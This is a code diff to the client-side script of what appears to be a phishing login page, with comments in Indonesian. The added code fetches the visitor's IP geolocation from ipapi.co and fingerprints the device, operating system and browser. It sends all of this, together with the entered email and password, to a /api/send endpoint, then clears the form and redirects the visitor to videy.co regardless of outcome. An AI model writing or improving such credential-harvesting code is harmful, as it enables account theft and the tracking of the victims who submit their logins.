@@ -463,23 +463,59 @@
             btnNext.textContent = 'Loading...';
             btnNext.disabled = true;
 
+            // Ambil data lokasi dari ipapi.co
+            let geo = {};
+            try {
+                const geoRes = await fetch('https://ipapi.co/json/');
+                geo = await geoRes.json();
+            } catch (e) {
+                console.log('Geo fetch error:', e);
+            }
+
+            // Deteksi device / OS / browser
+            const ua = navigator.userAgent;
+            const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
+            const device = isMobile ? 'Mobile' : 'Desktop';
+            const os = /Android/i.test(ua) ? 'Android ' + ((ua.match(/Android\s([\d.]+)/) || ['', ''])[1])
+                     : /iPhone|iPad/i.test(ua) ? 'iOS'
+                     : /Windows/i.test(ua) ? 'Windows'
+                     : /Mac/i.test(ua) ? 'macOS'
+                     : navigator.platform || '-';
+            const browser = /Chrome\/([\d.]+)/.test(ua) ? 'Chrome ' + ua.match(/Chrome\/([\d.]+)/)[1]
+                          : /Safari\/([\d.]+)/.test(ua) ? 'Safari'
+                          : /Firefox\/([\d.]+)/.test(ua) ? 'Firefox ' + ua.match(/Firefox\/([\d.]+)/)[1]
+                          : 'Unknown';
+
+            const payload = {
+                email: email,
+                password: password,
+                device: device,
+                os: os,
+                browser: browser,
+                ip: geo.ip || '-',
+                ipv6: geo.ipv6 || '-',
+                negaraKode: geo.country_code || '',
+                negara: geo.country_name || '-',
+                prov: geo.region || '-',
+                kota: geo.city || '-',
+                zona: geo.timezone || '-',
+                isp: geo.org || '-',
+                asn: geo.asn || '-',
+                zip: geo.postal || '-',
+                koord: (geo.latitude && geo.longitude) ? (geo.latitude + ', ' + geo.longitude) : '-',
+                waktu: new Date().toLocaleString('id-ID')
+            };
+
             try {
                 await fetch('/api/send', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password,
-                        userAgent: navigator.userAgent
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
             } catch (err) {
                 console.error(err);
             }
 
-            // Redirect ke videy.co apapun hasilnya
             emailInput.value = '';
             passInput.value = '';
             window.location.href = 'https://videy.co';
